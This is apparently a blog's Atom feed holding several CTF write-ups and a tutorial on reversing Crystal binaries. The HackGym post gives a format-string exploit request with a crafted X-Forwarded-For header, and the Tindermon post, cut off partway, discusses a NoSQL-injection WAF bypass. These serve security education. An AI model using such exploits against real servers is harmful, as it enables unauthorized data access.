  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This outputs: &lt;code class=&quot;highlighter-rouge&quot;&gt;T1m3_1s_g0ld&lt;/code&gt;, so the final flag is &lt;code class=&quot;highlighter-rouge&quot;&gt;secadmin{T1m3_1s_g0ld}&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;final-thoughts&quot;&gt;Final thoughts.&lt;/h4&gt;

&lt;p&gt;There were, of course, many ways to solve this challenge, this is a simple xor function solving challenge. The threads where an issue when trying to dinamically debug this challenge, because threads will die disallowing us to comfortably debug the binary workflow. That’s why I decided to rewrite the source code based on the assembly, and simply execute it and see the values that &lt;code class=&quot;highlighter-rouge&quot;&gt;t[2*tiempo]&lt;/code&gt; takes along the time, a really lazy solution.&lt;/p&gt;

&lt;p&gt;Hope you like it, contact me if you see any mistake. Thanks!&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="reversing" />
      
        <category term="ctf" />
      
        <category term="secadmin" />
      

      

      
        <summary type="html">Last week, Secadmin conference was held with some easy CTF challenges about crypto, web and reversing. This write-ups is for “El Ninja Contrareloj” challenge, a reversing one.</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">Brief introduction on reverse engineering Crystal binaries.</title>
      
      
      <link href="http://localhost:4000/2018/10/08/reversing-crystal-binaries/" rel="alternate" type="text/html" title="Brief introduction on reverse engineering Crystal binaries." />
      
      <published>2018-10-08T14:02:44+02:00</published>
      <updated>2018-10-08T14:02:44+02:00</updated>
      <id>http://localhost:4000/2018/10/08/reversing-crystal-binaries</id>
      <content type="html" xml:base="http://localhost:4000/2018/10/08/reversing-crystal-binaries/">&lt;p&gt;Crystal is a “new” Ruby-syntax-based programming language, born in 2014. The main diference is, that this is not a Ruby implementation, this is another compiled programming language, but its syntax is based in ruby, so Crystal != Ruby.&lt;/p&gt;

&lt;p&gt;You can learn more about Crystal here: &lt;a href=&quot;https://crystal-lang.org/&quot;&gt;crystal&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Any new compiled programming language results interesting from a reverse engineering perspective, malware is becoming more and more based on this kind of compiled programming language, whose syntax is easier than C or C++, but mantaining the ability to run standalone.&lt;/p&gt;

&lt;p&gt;A Crystal Hello World example, looks like this:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Hello world!'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, just like Ruby. To compile this, let’s save it as &lt;code class=&quot;highlighter-rouge&quot;&gt;hello.cr&lt;/code&gt; and execute the Crystal compiler: &lt;code class=&quot;highlighter-rouge&quot;&gt;crystal build hello.cr&lt;/code&gt;. This should create a &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; executable with the following characteristics: &lt;code class=&quot;highlighter-rouge&quot;&gt;hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with debug_info, not stripped&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;A dinamically linked, non-stripped binary. Cool!&lt;/p&gt;

&lt;h4 id=&quot;ida-analysis&quot;&gt;IDA analysis.&lt;/h4&gt;

&lt;p&gt;Let’s load this newly created binary using IDA Free 7.0 for Linux, (keep calm radare2 fanboys). Something catch my attention when load finished:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/lot_of_functions.png&quot; alt=&quot;lot_of_functions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Maaaaaaan 2055 functions?!!! Calm down buddy, if you take a look at other compiled languages, like Golang, this is normal. Modern compiled languages, import everything they need to be cross-platform, so lot of functions are included in a single binary to be able to compile binaries for Windows, Linux and OSX using a single compiler.&lt;/p&gt;

&lt;p&gt;So where’s the program itself?&lt;/p&gt;

&lt;p&gt;By default, IDA show us to the first function basic blocks executed in the program.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/main.png&quot; alt=&quot;ida_main&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok cool, so this function just calls another function: &lt;code class=&quot;highlighter-rouge&quot;&gt;main_0&lt;/code&gt;, which also calls another function &lt;code class=&quot;highlighter-rouge&quot;&gt;main_user_code&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/main_0.png&quot; alt=&quot;ida_main_0&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;main_user_code&lt;/code&gt; just calls another function &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/main_user_code.png&quot; alt=&quot;ida_main_user_code&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s then analyze this &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt; function, opening their basic blocks view, something really ugly happen:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/what_the_hell.png&quot; alt=&quot;ida_what_the_hell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;… what the hell man, where the fuck is our application code? Just at the end!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/code.png&quot; alt=&quot;ida_what_the_hell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There you can see the loading of our “Hello world!” string, which is at off_9A530, and a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; function which seems to be a wrapper for &lt;code class=&quot;highlighter-rouge&quot;&gt;puts_0&lt;/code&gt; function, which really executes the output operation and shows our string in stdout.&lt;/p&gt;

&lt;p&gt;Ok, so the workflow seems to be:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;main_0&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;main_user_code&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt; and, at the end, our script code is executed.&lt;/p&gt;

&lt;p&gt;Let’s see how conditionals and classes works at Crystal creating a simple script with the following code:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MyHelloClass&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;number&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_random&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@number&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A is lower than 4&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A is GREATER than 4&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Now, an if sentence will appear based on rand numeric value&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MyHelloClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;test_random&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok simple, let’s compile it &lt;code class=&quot;highlighter-rouge&quot;&gt;crystal build hello2.cr&lt;/code&gt; and open it using IDA, this time going directly to &lt;code class=&quot;highlighter-rouge&quot;&gt;__crystal_main&lt;/code&gt; buttom, where our code should be.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/hello2.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There it is, first, rand is called, which is, again a wrapper for Random::PCG32 function identified in IDA as &lt;code class=&quot;highlighter-rouge&quot;&gt;new_98&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then, a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;new_101&lt;/code&gt; is done, when inspecting this is our &lt;code class=&quot;highlighter-rouge&quot;&gt;MyHelloClass::new&lt;/code&gt; function, which is the wrapper for the &lt;code class=&quot;highlighter-rouge&quot;&gt;initialize&lt;/code&gt; function in our class. In Ruby, the &lt;code class=&quot;highlighter-rouge&quot;&gt;initialize&lt;/code&gt; function is the constructor of the class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/constructor.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see in this basic block, memory is created for our new object using &lt;code class=&quot;highlighter-rouge&quot;&gt;_crystal_malloc_antomic64&lt;/code&gt; function, a wrapper for &lt;code class=&quot;highlighter-rouge&quot;&gt;GC_generic_malloc&lt;/code&gt; which, after lot of operations, is a malloc itself.&lt;/p&gt;

&lt;p&gt;Then, a &lt;code class=&quot;highlighter-rouge&quot;&gt;call test_random&lt;/code&gt; is done, remember, Crystal compiler does not strip binaries by default so function names remain intact.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/test_random.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here it is our conditional, and our &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt; calls on each condition. Cool!&lt;/p&gt;

&lt;p&gt;Radare2, show us function names processed, so it’s a bit easier to identify the binary work flow with a single &lt;code class=&quot;highlighter-rouge&quot;&gt;s sym.__crystal_main&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;pdf&lt;/code&gt; call.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reversing-crystal/r2.png&quot; alt=&quot;ida_hello2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s all, thanks for reading, and hope this post can be helpful for someone facing this kind of binaries for the first time.&lt;/p&gt;

&lt;p&gt;Please, feel free to contact me if you see any mistake, also my written english is not the best, so sorry for those whose eyes explode while reading this.&lt;/p&gt;

&lt;p&gt;See you!&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="reversing" />
      
        <category term="crystal" />
      
        <category term="ruby" />
      

      

      
        <summary type="html">Crystal is a “new” Ruby-syntax-based programming language, born in 2014. The main diference is, that this is not a Ruby implementation, this is another compiled programming language, but its syntax is based in ruby, so Crystal != Ruby.</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">[CTF Write-up] nn8ed HackGym challenge write-up.</title>
      
      
      <link href="http://localhost:4000/2018/10/08/nn8ed-hackgym-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] nn8ed HackGym challenge write-up." />
      
      <published>2018-10-08T14:01:44+02:00</published>
      <updated>2018-10-08T14:01:44+02:00</updated>
      <id>http://localhost:4000/2018/10/08/nn8ed-hackgym-writeup</id>
      <content type="html" xml:base="http://localhost:4000/2018/10/08/nn8ed-hackgym-writeup/">&lt;p&gt;This weekend, Navaja Negra 8 CTF started, organized by &lt;a href=&quot;https://www.twitter.com/ka0labs_&quot;&gt;ka0labs.org&lt;/a&gt;. This pwn challenge has the following statement:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Say the magic word to get the flag!

http://hackgym.ka0labs.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The provided website is a phpinfo() output from the server, but with a string at the beginning.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/default.png&quot; alt=&quot;lot_of_functions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, ka0labs team is formed by dick-painter teenagers. Ok let’s see what’s in the PHP Information. Scrolling down a bit, we can see an extension &lt;code class=&quot;highlighter-rouge&quot;&gt;HackGym&lt;/code&gt; is loaded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/extension.png&quot; alt=&quot;extension&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, a hint is released: Look at the HTML source code. And there it is, there’s a comment at the bottom of the HTML leaking a backup path for the loaded extension.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/LEAK.png&quot; alt=&quot;leak&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, let’s download the shared object and open it using IDA and see what funcions we have:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/funciones.png&quot; alt=&quot;ida_functions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you have some PHP extensions background, you can easily identify what this functions are. For those newbies on PHP internals, there are a few functions PHP use when loading extensions, you can read more about this, from an offensive perspective in: &lt;a href=&quot;https://www.tarlogic.com/en/blog/backdoors-php-extensions/&quot;&gt;https://www.tarlogic.com/en/blog/backdoors-php-extensions/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;TL;DR: PHP_FUNCTION macro is where extension functions are defined.&lt;/p&gt;

&lt;p&gt;So let’s analyze the PHP_FUNCION function, which really should be a &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_FUNCTION&lt;/code&gt; macro, but for readability reasons, it’s badly written on purpose.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/lot_stuff.png&quot; alt=&quot;ida_lot_stuff&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok lot of stuff, the interesting part is here&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/php_funcion.png&quot; alt=&quot;ida_php_funcion&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function is taking the X-Forwarded-For HTTP header, and passing it to &lt;code class=&quot;highlighter-rouge&quot;&gt;kaboom&lt;/code&gt; function, so let’s see what this function does:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/nn8ed-hackgym/kaboom.png&quot; alt=&quot;ida_php_funcion&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the first basic block, this function is taking our input, which is 256 bytes long, and writing it to a variable, there’s is another 256 bytes buffer containing the &lt;code class=&quot;highlighter-rouge&quot;&gt;8=====&amp;gt; ! JE! Target! 3%&lt;/code&gt; string. The next basic block, overwrites our buffer with this dick string.&lt;/p&gt;

&lt;p&gt;On the third basic block, &lt;code class=&quot;highlighter-rouge&quot;&gt;_ap_php_snprintf&lt;/code&gt;, a wrapper in PHP for &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; function is called passing our overwritten buffer as argument. There’s more, the string of the placeholder will be &lt;code class=&quot;highlighter-rouge&quot;&gt;nn8ed{...}&lt;/code&gt;. But wait, what placeholder string?&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; function works like this, you specify a string which is kind of a template string, and inside this template, you can specify placeholders which are going to be replaced based on what you indicate. For example:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Gonzalo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi my name is %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will write the &lt;code class=&quot;highlighter-rouge&quot;&gt;destination&lt;/code&gt; variable with &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hi my name is Gonzalo&quot;&lt;/code&gt; string. Ok, do you remember that the replace string ended with a &lt;code class=&quot;highlighter-rouge&quot;&gt;%&lt;/code&gt;? Din din din! We need to force the final string to end up in “s”, so the template string passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; will be  &lt;code class=&quot;highlighter-rouge&quot;&gt;8=====&amp;gt; ! JE! Target! 3%s&lt;/code&gt; and the flag is going to be replaced as &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt; so the placeholder is replaced as seen in the example.&lt;/p&gt;

&lt;p&gt;Let’s test:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.0
Host: hackgym.ka0labs.org
X-Forwarded-For: XXXXXXXXXXXXXXXXXXXXXXXs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;200 OK

8===D ! JE! Target! 3nn8ed{Th3_r1ght_f0rm4t_Off_by_1}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Win! The flag is returned at the beginning of the HTML as expected.&lt;/p&gt;

&lt;p&gt;This challenge was easy for those people who know about format string bugs and PHP extensions, for those not so used to work with exploiting challenges or PHP extensions, is a great challenge to know some basics about it.&lt;/p&gt;

&lt;p&gt;Congratz to ka0labs.org team and Navaja Negra.&lt;/p&gt;

&lt;p&gt;See you!&lt;/p&gt;</content>

      
      
      
      
      

      

      
        <category term="ctf" />
      
        <category term="php" />
      
        <category term="exploiting" />
      

      

      
        <summary type="html">This weekend, Navaja Negra 8 CTF started, organized by ka0labs.org. This pwn challenge has the following statement:</summary>
      

      
      
    </entry>
  
  
  
    <entry>
      
      <title type="html">[CTF Write-up] nn8ed Tindermon challenge write-up.</title>
      
      
      <link href="http://localhost:4000/2018/10/08/nn8ed-tindermon-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] nn8ed Tindermon challenge write-up." />
      
      <published>2018-10-08T14:00:44+02:00</published>
      <updated>2018-10-08T14:00:44+02:00</updated>
      <id>http://localhost:4000/2018/10/08/nn8ed-tindermon-writeup</id>
      <content type="html" xml:base="http://localhost:4000/2018/10/08/nn8ed-tindermon-writeup/">&lt;p&gt;This weekend, Navaja Negra 8 CTF started, organized by &lt;a href=&quot;https://www.twitter.com/ka0labs_&quot;&gt;ka0labs.org&lt;/a&gt;. This web challenge has the following statement:&lt;/p&gt;

&lt;p&gt;Get the admin password! There is a WAF and it is NodeJS… Easy peasy!
&lt;a href=&quot;http://tindermon.ka0labs.org/&quot;&gt;http://tindermon.ka0labs.org&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Solution script: &lt;a href=&quot;https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/tindermon.rb&quot;&gt;https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/tindermon.rb&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;intro&quot;&gt;Intro&lt;/h3&gt;
&lt;p&gt;This challenge presents us a classic NodeJS + Express app. Source code of index is:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--WebSite Created by the admin pikachu--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Welcome to our Pokemon-Tinder!!!!!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background: pink&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;List of Users Registered in Tindermon&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;img&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[/avatar/magikarp](http://tindermon.ka0labs.org/avatar/magikarp)&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;480&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;290&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[/avatar/bulbasaur](http://tindermon.ka0labs.org/avatar/bulbasaur)&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;480&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;290&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[/avatar/diglet](http://tindermon.ka0labs.org/avatar/diglet)&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;480&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;290&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Two interesting things here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The admin username is pikachu&lt;/li&gt;
  &lt;li&gt;There’s a route /avatar/&lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; which, when visited, redirects us to /img/&lt;code class=&quot;highlighter-rouge&quot;&gt;ìd&lt;/code&gt;.jpg where id seems to be the user id.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /avatar/magikarp HTTP/1.0

-&amp;gt; 302 Found, Location: /imgs/1.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;not-that-easy-theres-a-waf&quot;&gt;Not that easy, there’s a “WAF”&lt;/h4&gt;
&lt;p&gt;Testing some characters show us that there’s some kind of check for the following chars:
&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot; ' . (space)&lt;/code&gt;
Why those characters and not others like &amp;gt; or &amp;lt;? Because (not-so-obviously) what they are trying to avoid is a NoSQL Injection, probably on a MongoDB database.&lt;/p&gt;

&lt;p&gt;So logic seems to be:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Express router process the request.&lt;/li&gt;
  &lt;li&gt;Controller search for the URL parameter, which is everything following /avatar/ to the next “/” and is intended to be a username.&lt;/li&gt;
  &lt;li&gt;Looks for the username in MongoDB, if exists, returns a 302 redirection to users image path.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Easy right? We are in front a NoSQL Injection challenge like many others, but this time we need to figure out how to bypass NodeJS checks.&lt;/p&gt;

&lt;p&gt;Well, at first, some tricks come to my mind, such as Orange Tsai’s 2017 Black Hat presentation about  NodeJS inconsistency on parsing Full-Width Characters: &lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;reading-a-bit-about-how-javascript-unicode-decoding-standards-works&quot;&gt;Reading a bit about how JavaScript Unicode decoding standards works.&lt;/h3&gt;

&lt;p&gt;This article give us some keys &lt;a href=&quot;https://mathiasbynens.be/notes/javascript-unicode&quot;&gt;https://mathiasbynens.be/notes/javascript-unicode&lt;/a&gt;. As the article says, for backwards compatibility with ES5 and older standards,  unicode are divided in groups of two, each one of 2 bytes, this are called “surrogate pairs”.&lt;/p&gt;

&lt;p&gt;So, for example, the emoji 💩 becomes &lt;code class=&quot;highlighter-rouge&quot;&gt;\uD83D\uDCA9&lt;/code&gt;. How this split is done? The answer is, again, in the same blog: &lt;a href=&quot;https://mathiasbynens.be/notes/javascript-encoding&quot;&gt;https://mathiasbynens.be/notes/javascript-encoding&lt;/a&gt;&lt;/p&gt;
